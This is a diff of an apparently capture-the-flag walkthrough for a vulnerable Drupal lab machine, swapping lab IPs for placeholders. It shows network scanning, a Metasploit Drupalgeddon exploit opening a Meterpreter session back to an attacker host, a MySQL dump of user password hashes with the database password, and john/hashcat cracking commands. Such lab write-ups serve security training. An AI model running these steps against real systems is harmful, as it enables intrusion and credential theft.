@@ -29,13 +29,13 @@ The target machine was identified in the NAT network.
 
 **Network discovery**  
 ```bash
-sudo netdiscover -r 192.168.25.0/24
+sudo netdiscover -r <target_subnet>/24
 ```
-Discovered host: 192.168.25.148
+Discovered host: <target_IP>
 
 **Nmap scan**
 ```bash
-sudo nmap -sC -sV 192.168.25.148
+sudo nmap -sC -sV <target_IP>
 ```
 Open ports:
 ```text
@@ -61,9 +61,9 @@ Tried **drupal_drupalgeddon2** (`check` inconclusive), then fell back to the old
 msfconsole
 search drupal
 use exploit/multi/http/drupal_drupageddon
-set RHOSTS 192.168.25.148
+set RHOSTS <target_IP>
 set TARGETURI /
-set LHOST 192.168.25.128
+set LHOST <attacker_IP>
 set TARGET 0
 run
 # if no session:
@@ -81,16 +81,16 @@ We first tried **drupalgeddon2** (`check` was inconclusive), then fell back to t
 msfconsole
 search drupal
 use exploit/multi/http/drupal_drupageddon
-set RHOSTS 192.168.25.148
+set RHOSTS <target_IP>
 set TARGETURI /
-set LHOST 192.168.25.128
+set LHOST <attacker_IP>
 set TARGET 0
 run
 ```
 Notes:
 - Module: `exploit/multi/http/drupal_drupageddon` (Rank: excellent)
 - `TARGETURI` must be “/” (Drupal in web root)
-- `LHOST` set to attacker IP (`192.168.25.128`); `RHOSTS` `192.168.25.148`
+- `LHOST` set to attacker IP (`<attacker_IP>`); `RHOSTS` `<target_IP>`
 
 Result: a Meterpreter session was successfully opened.
 
@@ -165,7 +165,7 @@ mysql -u dbuser -p'R0ck3t' -D drupaldb -e "SELECT uid,name,mail,pass FROM users;
 - Crack the hashes offline:
   - `john --format=drupal7 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt`
   - or `hashcat -m 7900 hashes.txt /usr/share/wordlists/rockyou.txt`
-- If `Fred`’s password is recovered, try SSH: `ssh Fred@192.168.25.148`
+- If `Fred`’s password is recovered, try SSH: `ssh Fred@<target_IP>`
 
 ## Privilege Escalation
 
@@ -225,7 +225,7 @@ Reading the final flag:
 
 Output (partially redacted to avoid full spoiler):
 
-Well done!!!!  
+Well done.
 Hopefully you've enjoyed this and learned some new skills.  
 [... output truncated ...]  
 
